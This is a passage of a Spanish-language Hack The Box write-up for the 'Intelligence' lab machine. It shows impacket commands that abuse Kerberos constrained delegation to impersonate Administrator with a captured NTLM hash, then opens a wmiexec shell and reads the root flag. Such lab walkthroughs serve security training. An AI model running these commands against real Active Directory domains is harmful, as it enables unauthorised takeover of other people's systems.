Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos sincronizamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>ntpdate <span class="nt">-s</span> 10.10.10.248
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-spn</span> WWW/dc.intelligence.htb <span class="nt">-impersonate</span> Administrator intelligence.htb/svc_int <span class="nt">-hashes</span> :4c395675187a74271de7c4af867ad417
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
</code></pre></div></div>

<ul>
  <li>Ahora nos autenticamos con el <code class="language-plaintext highlighter-rouge">ccache</code> y exportamos la variable de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
</code></pre></div></div>

<ul>
  <li>Ahora nos autenticamos y vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-wmiexec dc.intelligence.htb <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>intelligence<span class="se">\a</span>dministrator

C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
1b2c72e788bdcc6d73cb1b9175fb420c

C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>